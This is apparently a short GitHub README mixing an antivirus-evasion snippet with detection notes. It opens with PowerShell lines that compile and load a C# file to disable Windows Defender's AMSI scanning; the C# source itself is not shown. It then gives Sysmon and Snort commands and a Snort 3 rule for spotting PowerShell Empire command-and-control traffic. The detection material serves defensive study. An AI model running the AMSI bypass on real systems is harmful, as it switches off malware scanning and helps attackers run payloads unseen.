for education purpose only!

#Bypass Defender AV AMSI.dll

Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -OutputAssembly "Source.dll"
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\\Source.dll"))
[BP.AMS]::Disable()


#detect powershell process using sysmon and wazuh

Sysmon64.exe -accepteula -i sysconfig.xml

#detect powershell empire using snort :

analyze pcap with snort
snort -c /usr/local/etc/snort/snort.lua -r /home/sysadmin/pcap/http_powershell_empire.pcap -Acmg -k none -q # check packets processing by snort.

![image](https://user-images.githubusercontent.com/92370823/148438040-ae3a9a3f-17fe-4987-83e4-d44f7ae87e39.png)

#our snort3 rule, detect powerhellempire cnc malware connection.

alert http (
        msg:"PowerShellEmpire was detected";
        flow:to_server,established;
        http_uri:path;
        content:"/login/process.php",nocase;
        http_header;
        content:"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",nocase;
        http_cookie;
        content:"session",nocase;
        reference:url,attack.mitre.org/techniques/T1086;
        reference:url,powershellempire.com;
        classtype:trojan-activity;
        sid:56465; rev:5;
)

#snort 3 Buffers
#http_inspect::http_client_body
#http_inspect::http_cookie
#http_inspect::http_header
#http_inspect::http_method
#http_inspect::http_param
#http_inspect::http_raw_body
#http_inspect::http_raw_cookie
#http_inspect::http_raw_header
#http_inspect::http_raw_request
#http_inspect::http_raw_status
#http_inspect::http_raw_trailer
#http_inspect::http_raw_uri
#http_inspect::http_stat_code
#http_inspect::http_stat_msg
#http_inspect::http_trailer
#http_inspect::http_true_ip
#http_inspect::http_uri
#http_inspect::http_version
#http_inspect::js_data
#http_inspect::vba_data

snort -c /usr/local/etc/snort/snort.lua -r /home/sysadmin/pcap/http_powershell_empire.pcap -Acmg 
![image](https://user-images.githubusercontent.com/92370823/148611213-23ffb093-cd89-447e-ae07-c61640ae1a48.png)


